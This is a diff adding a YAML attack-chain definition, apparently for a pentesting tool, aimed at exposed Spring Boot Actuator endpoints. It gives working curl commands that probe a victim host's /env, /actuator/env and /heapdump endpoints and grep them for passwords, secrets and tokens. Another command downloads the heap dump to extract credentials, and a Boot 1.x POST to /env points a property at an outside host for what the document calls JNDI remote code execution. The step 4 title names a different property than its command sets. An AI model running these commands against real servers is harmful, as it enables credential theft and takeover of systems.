@@ -1,0 +1,44 @@
+chain_id: springboot_actuator_env
+title: "Spring Boot — /actuator/env / /env / /heapdump credentials disclosure"
+severity: HIGH
+tags: [web, springboot, actuator, info-disclosure, heapdump]
+
+trigger:
+  any_of:
+    - { path_pattern: "(?i)/(actuator|env|heapdump|configprops|trace)$" }
+    - { banner_pattern: "(?i)spring(boot)?" }
+
+description: |
+  Spring Boot Actuator endpoints expose runtime config, environment
+  variables (frequently with embedded credentials), and a full heap
+  dump. Older Boot 1.x versions allowed POST /env to set arbitrary
+  Spring properties → JNDI lookup → RCE.
+
+steps:
+  - id: 1
+    title: "Probe the canonical endpoints"
+    command: |
+      for ep in /env /actuator /actuator/env /actuator/heapdump /actuator/configprops /actuator/trace; do
+        echo "== $ep =="
+        curl -s -o /dev/null -w '%{http_code}\\n' "http://$VICTIMA${ep}"
+      done
+
+  - id: 2
+    title: "Read /actuator/env — passwords and tokens are typically in plaintext"
+    command: |
+      curl -s "http://$VICTIMA/actuator/env" | jq '.propertySources[].properties' | grep -iE 'password|secret|token|key' | head
+
+  - id: 3
+    title: "Pull the heapdump for offline analysis (eclipse MAT / pyhprof)"
+    command: |
+      curl -s "http://$VICTIMA/actuator/heapdump" -o heapdump.hprof
+      jhat heapdump.hprof
+      # Or: strings heapdump.hprof | grep -iE 'password|secret|api[_-]?key' | head
+
+  - id: 4
+    title: "Spring Boot 1.x — POST /env to set spring.cloud.bootstrap.location → JNDI RCE"
+    command: |
+      curl -X POST -d 'eureka.client.serviceUrl.defaultZone=http://10.0.2.15/x' http://$VICTIMA/env
+
+references:
+  - https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/spring-actuators
